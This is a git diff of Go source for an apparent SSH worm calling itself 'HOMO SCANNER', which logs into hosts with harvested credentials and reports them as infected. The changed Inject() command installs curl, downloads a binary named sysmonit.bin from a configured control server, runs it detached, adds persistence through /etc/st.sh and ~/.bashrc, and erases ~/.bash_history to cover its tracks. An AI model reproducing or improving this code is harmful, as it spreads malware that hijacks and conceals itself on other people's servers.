@@ -25,6 +25,7 @@ func Scan() {
 		if er := recover(); er != nil {
 			println("Scan: ")
 			fmt.Print(er)
+			return
 		}
 	}()
 
@@ -40,13 +41,18 @@ func Scan() {
 			continue
 		}
 
-		fmt.Println(serv)
-		ses := sshNew(serv[1], serv[2], serv[0])
+		ses, err := sshNew(serv[1], serv[2], serv[0])
+		if err != nil {
+			fmt.Println("[HOMO SCANNER] Can't Infect: " + serv[1] + ":22")
+			continue
+		}
+
 		ses.Inject()
+		fmt.Println("[HOMO SCANNER] Infected: " + serv[1] + ":22")
 	}
 }
 
-func sshNew(login, pass string, host string) *Sshsess {
+func sshNew(login, pass string, host string) (*Sshsess, error) {
 
 	conf := &ssh.ClientConfig{
 		User:    login,
@@ -59,7 +65,7 @@ func sshNew(login, pass string, host string) *Sshsess {
 	conn, err := ssh.Dial("tcp", host+":22", conf)
 
 	if err != nil {
-		fmt.Println(err)
+		return &Sshsess{}, err
 	}
 
 	return &Sshsess{
@@ -68,7 +74,7 @@ func sshNew(login, pass string, host string) *Sshsess {
 		Login:    login,
 		Config:   conf,
 		Session:  conn,
-	}
+	}, nil
 }
 
 func (sess *Sshsess) Inject() {
@@ -84,7 +90,7 @@ func (sess *Sshsess) Inject() {
 		host = config.GetConfig().Api.Server + ":" + config.GetConfig().Api.Port + config.GetConfig().Api.CustomPath
 	}
 
-	sshSesh.Run("rm ../bin/sysmonit.bin; curl -X POST http://" + host + " -o ../bin/sysmonit.bin ; chmod +x ../bin/sysmonit.bin ; ../bin/sysmonit.bin >> ~/.bashrc; ulimit -n 999999; ../bin/sysmonit.bin & disown")
+	sshSesh.Run("apt install curl -y; ulimit -n 999999; rm /bin/sysmonit.bin; curl -X POST http://" + host + " -o /bin/sysmonit.bin ; chmod +x /bin/sysmonit.bin ; /bin/sysmonit.bin & disown >> /etc/st.sh ; bash /etc/st.sh >> ~/.bashrc; bash /etc/st.sh ; rm ~/.bash_history")
 
 	sshSesh.Close()
 }
